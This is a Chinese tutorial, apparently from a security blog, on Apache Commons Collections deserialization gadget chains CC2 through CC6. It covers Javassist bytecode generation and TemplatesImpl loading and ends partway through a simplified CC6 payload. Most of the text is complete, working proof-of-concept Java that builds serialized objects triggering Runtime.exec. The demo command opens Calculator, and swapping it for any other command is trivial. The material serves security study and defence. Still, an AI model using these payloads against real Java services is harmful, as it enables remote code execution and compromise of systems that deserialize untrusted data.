师傅的，从创建类到创建构造方法都有 public class JavassistDemo { public static void createPseson() throws Exception { ClassPool pool = ClassPool.getDefault(); // 1. 创建一个空类 CtClass cc = pool.makeClass(&quot;Person&quot;); // 2. 新增一个字段 private String name; // 字段名为name CtField param = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, cc); // 访问级别是 private param.setModifiers(Modifier.PRIVATE); // 初始值是 &quot;xiaoming&quot; cc.addField(param, CtField.Initializer.constant(&quot;xiaoming&quot;)); // 3. 生成 getter、setter 方法 cc.addMethod(CtNewMethod.setter(&quot;setName&quot;, param)); cc.addMethod(CtNewMethod.getter(&quot;getName&quot;, param)); // 4. 添加无参的构造函数 CtConstructor cons = new CtConstructor(new CtClass[]{}, cc); cons.setBody(&quot;{name = \\&quot;xiaohong\\&quot;;}&quot;); cc.addConstructor(cons); // 5. 添加有参的构造函数 cons = new CtConstructor(new CtClass[]{pool.get(&quot;java.lang.String&quot;)}, cc); // $0=this / $1,$2,$3... 代表方法参数 cons.setBody(&quot;{$0.name = $1;}&quot;); cc.addConstructor(cons); // 6. 创建一个名为printName方法，无参数，无返回值，输出name值 CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]{}, cc); ctMethod.setModifiers(Modifier.PUBLIC); ctMethod.setBody(&quot;{System.out.println(name);}&quot;); cc.addMethod(ctMethod); //这里会将这个创建的类对象编译为.class文件 cc.writeFile(&quot;./&quot;); } public static void main(String[] args) { try { createPseson(); } catch (Exception e) { e.printStackTrace(); } }} 反编译一下 Person.class 可以看到最终构造出来的代码是这样的 javassist 带来的攻击面在于 Java 进行实例化对象的时候会调用 static 代码块 创建一个 class public class JDemo { public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.writeFile(); }} 接下来利用 TemplatesImpl 来更进一步 TemplatesImpl#newTransformer 调用了 getTransletInstance 先看第一部分，如果 _name 不为null的值，_class设置为 null，这样会调用 defineTransletClases 跟进 defineTransletClases，注意几个问题 _class[i] = loader.defineClass(_bytecodes[i]); 对 byte 进行了还原 需要设置父类为 AbstractTranslet ，默认状态下_transletIndex 的值为 -1，如果进入这个 if 比较后，会给_transletIndex 附值至少为 0，不然会抛出异常。这里我们也不能通过反射的方式来设置_transletIndex的值，因为还是会进入到_auxClasses 方法中，此方法会报出错误，无法正常的序列化。 回到 TemplatesImpl#getTransletInstance 的第二部分，这里进行了实例化，也就是这里会调用我们 static 代码块的代码 构造调用 TemplatesImpl#newTransformer 结合 javassist 可以实现一个 RCE 的 demo public class JDemo { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, &quot;_name&quot;, &quot;TestDemo&quot;); setFieldValue(templates, &quot;_class&quot;, null); // 因为代码中存在 _tfactory.getExternalExtensionsMap() 所以需要 _tfactory 进行赋值 不能为null，这里与 JDK 版本有关 setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); templates.newTransformer(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) { field = getField(clazz.getSuperclass(), fieldName); } } return field; }} Gadget chain沿用之前 CC1 的思路，目前的核心目的是寻找调用 ChainedTransformer 的 transform 的类 看一下 TransformingComparator#compare ,在上面构造函数实例化对象的时候给 this.transformer 附值为传入的 transformer，这里直接调用 transform 方法，符合我们的构造条件 由此我们后续目的就是寻找调用了这个方法的。利用链比较复杂，我们切换到正向的思路 PriorityQueue#readObject ，最后一行调用了 heapify 方法 PriorityQueue#heapify 里调用了 siftDown ，但是这里有个条件就是要满足 int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0。这里 size 如果为 1 的话，也就是我们只给 PriorityQueue add 一个值的时候， (size &gt;&gt;&gt; 1) - 1 算出来为 -1，如果想让其满足 for 循环表达式，size 至少为 2 看一下 PriorityQueue#siftDown 随后调用到关键的方法 PriorityQueue#siftDownUsingComparator 在漫长的调用栈中，最重要的参数就是 comparator。可控我们即可 RCE 优化 payload 的过程中，网上很多文章都会用反射去附值，其实 PriorityQueue 初始化的时候也可以直接附值，但是会触发多次 payload。 fake CC2 payload public class CC2 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, NoSuchFieldException, IOException { Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); TransformingComparator comparator = new TransformingComparator(fakeChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); field.setAccessible(true); field.set(queue, comparator); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(queue); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} CC2 其实核心命令执行的方式不是靠的 ChainedTransformer 与 InvokerTransformer 等结合的方式。它变为了使用 TemplatesImpl 这个类来调用，也就是前文 basics 的内容 前文我们利用 TemplatesImpl#newTransformer 结合 javassist 实现了一个 RCE demo 接下来我们的任务是如何调用 TemplatesImpl#newTransformer 以及如何与readObject 结合 回顾 InvokerTransformer，调用其 transform 方法，如果可控 transform 方法中参数，以及 this.iMethodName 即可调用任意类的任意方法 回顾之前 CC2 gadget chain 中执行 transform 的点，只需要 obj1 可控，则满足条件 TemplatesImpl 利用链 payload public class TemplatesImplDemo { public static void main(String[] args) throws Exception { Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2); // javassist ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;Demo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;); setFieldValue(templates, &quot;_class&quot;, null); Object[] queue_array = new Object[]{templates, 1}; Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue, queue_array); Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue, 2); Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue, comparator); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(queue); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) { field = getField(clazz.getSuperclass(), fieldName); } } return field; }} 利用链 Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() CommonsCollections2 不能在 3.1-3.2.1版本利用成功 根本原因在于CommonsCollections2的payload中使用的TransformingComparator在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化 CommonsCollections3BasicsCC3 相比于 CC1 也只是更改了命令执行的方式 先看一下 InstantiateTransformer#transform，就是通过反射调用构造函数来实例化对象 CC2 里面我们改变了命令执行的方式为 TemplatesImpl#newTransformer 来调用。CC2里触发 TemplatesImpl#newTransformer 是靠的 InvoerTransformer#transform，且 transform 参数可控 CC3 用到了 TrAXFilter 这个类，其构造方法会调用 templates.newTransformer()，且 templates 可控 回顾我们上面讲的 InstantiateTransformer#transform，那么可以实现命令执行 public class Demo { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); setFieldValue(templates, &quot;_name&quot;, &quot;TestDemo&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }); chain.transform(&quot;random&quot;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) { field = getField(clazz.getSuperclass(), fieldName); } } return field; }} Gadget chain上述的 RCE demo 结合 CC1 的 LazyMap 利用链可以构造出 CC3 CC3 payload public class CC3 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); setFieldValue(templates, &quot;_name&quot;, &quot;TestDemo&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); Map innerMap = new HashMap(); Class clz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;); Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class); construct.setAccessible(true); LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, fakeChain); Constructor handler_construct = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); handler_construct.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class}, map_handler); Constructor AnnotationInvocationHandler_Construct = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandler_Construct.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(handler); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) { field = getField(clazz.getSuperclass(), fieldName); } } return field; }} 利用链 Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() CommonsCollections4BasicsCC4 没有新利用的类，CC2 跟 CC3 结合了一下 Gadget chainCC4 payload public class CC4 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); setFieldValue(templates, &quot;_name&quot;, &quot;TestDemo&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); TransformingComparator comparator = new TransformingComparator(fakeChain); PriorityQueue queue = new PriorityQueue(2); Object[] queue_array = new Object[]{templates, 1}; // gadget Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;); queue_field.setAccessible(true); queue_field.set(queue, queue_array); Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(queue, 2); Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); comparator_field.setAccessible(true); comparator_field.set(queue, comparator); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(queue); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) { field = getField(clazz.getSuperclass(), fieldName); } } return field; }} 利用链 Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() CommonsCollections5Basics适用版本：3.1-3.2.1，JDK 1.8 CC1、CC3 适用于 JDK7的环境，通过调用 AnnotationInvocationHandler 实现了 RCE，但是 JDK8 更新了 AnnotaionInvocationHandler 方法，使其 memberValues 变量不为构造的 LazyMap 实例 回顾我们之前 CC1 的 RCE demo CC1 LazyMap RCE demo public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo); mapDemo.get(&quot;random&quot;); }} 核心还是调用 LazyMap 的 get 方法，由此调用前面包装好的 ChainedTransformer 的 transform 方法。那么现在核心目的还是寻找到某个类可以传入一个 Map 对象，同时类里面的方法需要调用 Map 对象的 get 方法 Gadget chainLevel-1 payload public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, &quot;random&quot;); rceDemo.getValue(); }} 上述的 TiedMapEntry#getValue 调用了传入的 Map 对象的 get 方法 还是跟之前的思路一样，需要跟反序列化结合的话，需要继续构造 fake CC5 payload public class CC5 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, &quot;random&quot;); BadAttributeValueExpException finaldemo = new BadAttributeValueExpException(rceDemo); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(finaldemo); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} 上述代码执行并不会在 readObject 这里 RCE，他 RCE 的原因是因为在实例化的时候的 RCE，在这里触发了传入 TiedMapEntry 的 toString 而在下面 readObject 调用 val = valObj.toString(); 的时候， valObj 不为 TiedMapEntry 因此根据 valObj 的附值地方，重新构造 payload 通过反射构造 BadAttributeValueExpException 的 val值 CC5 payload， JDK1.8 public class CC5 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException { Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, &quot;random&quot;); BadAttributeValueExpException finaldemo = new BadAttributeValueExpException(&quot;random&quot;); Field valDemo = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); valDemo.setAccessible(true); valDemo.set(finaldemo, rceDemo); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(finaldemo); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} 利用链 Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() JDK7u21 下是不能利用的，究其原因看一下 BadAttributeValueExpException 类，没有重写的 readObject 方法 CommonsCollections6BasicsCC6 特点：适用范围广，受 JDK 版本影响最小 CC6 其实跟 CC5 是在 TiedMapEntry#getValue 延伸出来并行的两条链 回顾我们通过 TiedMapEntry#getValue 而进行 RCE 的 demo Level-0 payload public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, &quot;random&quot;); rceDemo.getValue(); }} 回顾 TiedMapEntry 里面的方法，CC5 用的是 TiedMapEntry#toString，里面调用了getValue， 那么其实在 TiedMapEntry 还有 hashCode 跟 equals 同样调用了 getValue Gadget chainCC6 其实就用到了 hashCode 方法，在向上寻找可控参数的以及调用到合适方法的时候，最终定位到 HashSet#readObject CC6 payload public class CC6 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException , InstantiationException, IOException, NoSuchFieldException { Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, &quot;random&quot;); HashSet map = new HashSet(1); map.add(&quot;foo&quot;); Field f = null; try { f = HashSet.class.getDeclaredField(&quot;map&quot;); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(&quot;backingMap&quot;); } f.setAccessible(true); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(&quot;table&quot;); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;); } f2.setAccessible(true); Object[] array = (Object[]) f2.get(innimpl); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(&quot;key&quot;); }catch(Exception e){ keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;); } keyField.setAccessible(true); keyField.set(node, rceDemo); Field cf = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); cf.setAccessible(true); cf.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(map); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} 核心是在调用 HashSet#readObject 的时候，调用 map 的 put 方法 后续调用到 HashMap#put 之后会调用到 HashMap#hash 随后调用到 TiedMapEntry.hashCode() 利用链 java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() Simpler Gadget chain简化链中用到了 HashMap#readObject 中的 hash 方法来触发 hashCode 方法 调用 hash 方法 令 key 为TiedMapEntry 对象，即可，这里直接使用 @phithon 师傅的代码 public class CommonsCollections6 { public static void main(String[] args) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new String[] { &quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;); Map expMap = new HashMap(); expMap.put(tme, &quot;valuevalue&quot;); outerMap.remove(&quot;keykey&quot;); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(transformerChain, transformers); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // 本地测试触发 System.out.println(barr); ObjectInputStream ois = new 